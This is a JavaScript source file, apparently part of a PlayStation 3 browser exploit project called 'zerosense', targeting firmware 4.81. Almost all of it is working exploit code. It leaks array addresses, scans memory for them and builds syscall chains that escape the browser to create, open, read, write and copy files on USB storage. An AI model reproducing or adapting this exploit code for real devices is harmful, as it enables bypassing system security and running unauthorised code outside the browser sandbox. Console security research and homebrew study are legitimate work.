/*eslint-disable no-unused-vars, no-param-reassign*/

///////////////////////////////////////

var ArrayLeaker = require('zerosense/ArrayLeaker');
var ChainBuilder = require('zerosense/ChainBuilder');
var Logger = require('zerosense/Logger');
var MemoryReader = require('zerosense/MemoryReader');
var Searcher = require('zerosense/Searcher');
var Offsets = require('zerosense/Offsets');
var Util = require('zerosense/Util');

var logger = null;

var memoryReader = null;
var offsets = null;
var searcher = null;

(function() {
	try {
		var ua = navigator.userAgent;

		var environment = {};
		
		/*environment.ps3 = ua.indexOf("PLAYSTATION 3") !== -1;
		environment.firmware = environment.ps3 ? ua.substr(ua.indexOf("PLAYSTATION 3") + 14, 4)
				: "0.00";
		environment.dex = true;*/
		
		if (true) {
			environment.ps3 = true;
			environment.firmware = "4.81";
			environment.dex = true;
		}		

		var log = document.getElementById("log");
		if (log === null) {
			throw new Error("Log element not found.");
		}

		Logger.init(log);
		window.logger = logger = Logger.getLogger();
	} catch (e) {
		alert(e);
		console.error(e, e.name, e.stack);
		return;
	}

	try {
		logger.clear();

		if (environment.ps3) {
			logger.info(`Detected a PS3 on FW ${environment.firmware} ${environment.dex ? 'DEX' : 'CEX'}.`);
		} else {
			logger.info("No PS3 detected. May not work as expected.");
		}

		memoryReader = new MemoryReader();
		searcher = new Searcher(memoryReader);
		
		offsets = Offsets.get(environment);

		////////////////////
		
		var buttonCreateFolder = document.getElementById("buttonCreateFolder");
		buttonCreateFolder.addEventListener("click", () => createFolder());
		
		var buttonCreateFolderMulti = document.getElementById("buttonCreateFolderMulti");
		buttonCreateFolderMulti.addEventListener("click", () => createFolderMulti());
		
		var buttonFileTest = document.getElementById("buttonFileTest");
		buttonFileTest.addEventListener("click", () => fileTest());
		
		var buttonFileCopyTest = document.getElementById("buttonFileCopyTest");
		buttonFileCopyTest.addEventListener("click", () => fileCopyTest());
		
		var buttonXhrTest = document.getElementById("buttonXhrTest");
		buttonXhrTest.addEventListener("click", () => xhrTest());
		
		var buttonXhrFileTest = document.getElementById("buttonXhrFileTest");
		buttonXhrFileTest.addEventListener("click", () => xhrFileTest());
		
		var buttonXhrFileCopy = document.getElementById("buttonXhrFileCopy");
		buttonXhrFileCopy.addEventListener("click", () => xhrFileCopy());
	} catch (e) {
		if (environment.ps3) {
			alert(e);
		}
		console.error(e, e.name, e.stack);
	}
})();

///////////////////////////////////////

var arrayLeaker = null;
var gtemp = null, addrGtemp = null;

function init() {
	if (arrayLeaker === null || !arrayLeaker.verify()) {
		logger.debug("Initializing...");
		
		arrayLeaker = new ArrayLeaker(memoryReader);
		
		var searchStart = 0x80190000;
		var searchEnd = 0x8efb0000;
		
		return searcher.searchArrayLeaker(searchStart, searchEnd - searchStart, arrayLeaker.getArray())
			.then((match) => {
				if (match === null) {
					arrayLeaker = null;
					throw new Error("Failed to init ArrayLeaker.");
				}
				
				logger.debug(`Found ArrayLeaker array at 0x${match.toString(16)}`);
				arrayLeaker.setAddress(match);
			})
			.then(() => {
				logger.debug("Creating buffers...");
				
				gtemp = Util.ascii("gtmp") + Util.pad(0x1000);
				addrGtemp = arrayLeaker.getAddress(gtemp);
				if (addrGtemp === null) {
					logger.error("Failed to get gtemp address.");
					return;
				}
				addrGtemp += 4;
				logger.debug(`Found gtemp at 0x${addrGtemp.toString(16)}`);
				
				logger.debug("Created buffers.");
				
				logger.debug("Initialized.");
			});
	}
	
	return Promise.resolve();
}

function createFolder() {
	logger.info("Creating folder...");
	
	Promise.resolve()
		.then(() => init())
		.then(() => {
			var path = "/dev_usb000/zerosense";
			var errno = fsMkdir(path);
			logger.info(`Errno: 0x${errno.toString(16)}`);
		})
		.then(() => logger.info("Created folder."))
		.catch((error) => logger.error(`Error while creating folder. ${error}`));
}

function createFolderMulti() {
	logger.info("Creating folder (multi)...");
	
	var p = Promise.resolve();
	
	for (let i = 0; i < 1000; i++) {
		p = p.then(() => init())
			.then(() => {
				var path = "/dev_usb000/zerosense";
				var errno = fsMkdir(path);
				logger.info(`${i} - Errno: 0x${errno.toString(16)}`);
			})
			.then(() => {
				return new Promise((resolve) => {
					setTimeout(resolve);
				});
			});
	}
	
	p = p.then(() => logger.info("Created folder (multi)."))
		.catch((error) => {
			logger.error(`Error while creating folder. ${error}`)
			logger.debug(`ArrayLeaker valid? ${arrayLeaker.verify()}`);
		});		
}

function fileTest() {
	logger.info("File test...");
	
	Promise.resolve()
		.then(() => init())
		.then(() => {
			var path = "/dev_usb000/test.txt";
			var result = fsOpen(path);
			var errno = result.errno;
			var fd = result.fd;
			logger.debug(`Errno: 0x${errno.toString(16)}`);
			logger.debug(`Fd: 0x${fd.toString(16)}`);
			
			var testStr = "This is a test!";
			result = fsWrite(fd, Util.ascii(testStr), testStr.length);
			errno = result.errno;
			var written = result.written;
			logger.debug(`Errno: 0x${errno.toString(16)}`);
			logger.debug(`Written: 0x${Util.hex32(written.high)}${Util.hex32(written.low)}`);
			
			errno = fsClose(fd);
			logger.debug(`Errno: 0x${errno.toString(16)}`);
		})
		.then(() => logger.info("File test done."))
		.catch((error) => logger.error(`Error while doing file test. ${error}`));
}

function fsMkdir(strpath) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataStr("path", Util.ascii(strpath))
		.addDataInt32("errno")
		.syscall(0x32B, "path", 0o700)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker);
	chain.execute();
	
	return chain.getDataInt32("errno");
}

function fsOpen(strpath) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataStr("path", Util.ascii(strpath))
		.addDataInt32("errno")
		.addDataInt32("fd")
		.syscall(0x321, "path", 0o102, "fd", 0o600)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker);
	chain.execute();
	
	var errno = chain.getDataInt32("errno");
	var fd = chain.getDataInt32("fd");
	return { errno: errno, fd: fd };
}

function fsRead(fd, size) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataBuffer("buffer", size)
		.addDataInt32("errno")
		.addDataInt64("read")
		.syscall(0x322, fd, "buffer", size, "read")
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker);
	chain.execute();
	
	var errno = chain.getDataInt32("errno");
	var read = chain.getDataInt64("read");
	var buffer = chain.getDataBuffer("buffer", read.low);
	
	return { errno: errno, read: read, buffer: buffer };
}

function fsWrite(fd, buffer, size) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataStr("buffer", buffer)
		.addDataInt32("errno")
		.addDataInt64("written")
		.syscall(0x323, fd, "buffer", size, "written")
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker);
	chain.execute();
	
	return { errno: chain.getDataInt32("errno"), written: chain.getDataInt64("written") };
}

function fsClose(fd) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataInt32("errno")
		.syscall(0x324, fd)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker);
	chain.execute();
	
	return chain.getDataInt32("errno");
}

function request(method, url) {
    return new Promise((resolve) => {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url);
        xhr.onload = () => {
        	resolve(xhr);
        };
        xhr.onerror = (e) => {
        	throw new Error(e);
        };
        xhr.send();
    });
}

function xhrTest() {
	logger.info("XHR test...");
	
	Promise.resolve()
		.then(() => request("GET", "xhr.txt"))
		.then((xhr) => {
			logger.debug(xhr.responseText);
		})
		.catch((error) => { logger.error(`Error during request. ${error}`); });
	
	logger.info("XHR test done.");
}

function xhrFileTest() {
	logger.info("XHR File test...");
	
	Promise.resolve()
		.then(() => init())
		.then(() => request("GET", "xhr.txt"))
		.then((xhr) => {
			var path = "/dev_usb000/xhr.txt";
			var result = fsOpen(path);
			var errno = result.errno;
			var fd = result.fd;
			logger.debug(`Errno: 0x${errno.toString(16)}`);
			logger.debug(`Fd: 0x${fd.toString(16)}`);
			
			var testStr = xhr.responseText;
			result = fsWrite(fd, Util.ascii(testStr), testStr.length);
			errno = result.errno;
			var written = result.written;
			logger.debug(`Errno: 0x${errno.toString(16)}`);
			logger.debug(`Written: 0x${Util.hex32(written.high)}${Util.hex32(written.low)}`);
			
			errno = fsClose(fd);
			logger.debug(`Errno: 0x${errno.toString(16)}`);
		})
		.then(() => logger.info("XHR File test done."))
		.catch((error) => logger.error(`Error while doing file test. ${error}`));
}

function xhrFileCopy() {
	logger.info("XHR file copy...");
	
	Promise.resolve()
		.then(() => init())
		.then(() => request("GET", "xhr.txt"))
		.then((xhr) => {
			var files = xhr.responseText.split(/\r?\n/);
			
			var p = Promise.resolve();
			
			for (let i = 0; i < files.length; i++) {
				p = p.then(() => {
					fileCopy("/dev_usb000/" + files[i], "/dev_usb000/zerosense/" + files[i]);
				});
			}
			
			return p;
		})
		.then(() => logger.info("XHR file copy done."))
		.catch((error) => logger.error(`Error while doing XHR file copy. ${error}`));
}

function fileCopy(fromPath, toPath) {
	logger.debug(`File copy: ${fromPath} -> ${toPath}`);
	
	var result = fsOpen(fromPath);
	var errno = result.errno;
	var fromFd = result.fd;
	logger.debug(`Errno: 0x${errno.toString(16)}`);
	logger.debug(`Fd: 0x${fromFd.toString(16)}`);
	
	result = fsOpen(toPath);
	errno = result.errno;
	toFd = result.fd;
	logger.debug(`Errno: 0x${errno.toString(16)}`);
	logger.debug(`Fd: 0x${toFd.toString(16)}`);
	
	result = fsRead(fromFd, 0x100);
	errno = result.errno;
	var read = result.read;
	var buffer = result.buffer;
	logger.debug(`Errno: 0x${errno.toString(16)}`);
	logger.debug(`Read: 0x${Util.hex32(read.high)}${Util.hex32(read.low)}`);
	logger.debug(`Buffer: ${Util.strhex(buffer)}`);			
	
	result = fsWrite(toFd, buffer, read.low);
	errno = result.errno;
	var written = result.written;
	logger.debug(`Errno: 0x${errno.toString(16)}`);
	logger.debug(`Written: 0x${Util.hex32(written.high)}${Util.hex32(written.low)}`);
	
	errno = fsClose(toFd);
	logger.debug(`Errno: 0x${errno.toString(16)}`);
	
	errno = fsClose(fromFd);
	logger.debug(`Errno: 0x${errno.toString(16)}`);
}

function fileCopyTest() {
	logger.info("File copy test...");
	
	Promise.resolve()
		.then(() => init())
		.then(() => {
			var fromPath = "/dev_usb000/copyme.txt";
			var toPath = "/dev_usb000/copyme_to.txt";
			
			fileCopy(fromPath, toPath);
		})
		.then(() => logger.info("File copy test done."))
		.catch((error) => logger.error(`Error while doing file test. ${error}`));
}

///////////////////////////////////////

